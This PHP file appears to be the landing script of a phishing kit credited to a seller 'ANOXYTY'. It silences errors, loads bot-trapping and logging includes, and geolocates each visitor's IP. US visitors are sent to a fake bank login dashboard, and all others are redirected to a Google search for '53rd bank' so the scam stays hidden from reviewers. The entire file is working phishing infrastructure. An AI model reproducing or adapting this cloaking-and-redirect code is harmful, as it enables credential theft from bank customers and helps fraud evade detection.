<?php
@error_reporting(0);
ini_set( "display_errors", 0); 
require_once 'anoxytytrap/logger.php';
include 'anoxytytrap/bite.php';
include 'anoxytytrap/country.php';

/*       
// made by ANOXYTY" // https://icq.im/Anoxyty / TELEGRAM ANOXYTY "HQ PAGE"
                           ______
        |\_______________ (_____\\______________
HH======#H###############H#######################
        ' ~""""""""""""""`##(_))#H\"""""Y########
                          ))    \#H\       `"Y###
                          "      }#H)
*/
	

$ip = getenv("REMOTE_ADDR");

$url = "http://www.geoplugin.net/json.gp?ip=".$ip;
$ch = curl_init();  
curl_setopt($ch,CURLOPT_URL,$url);
curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
$resp=curl_exec($ch);
curl_close($ch);
$details = json_decode($resp, true);
$countrycode = $details['geoplugin_countryCode']; 	  
 
if($countrycode=='US')
    header( 'Location: login?auth/dashboard#/dashboard/overviewAccounts/overview/index' ) ;
else 
    header( 'Location: https://www.google.com/search?client=firefox-b-d&q=53rd+bank' ) ;


?>
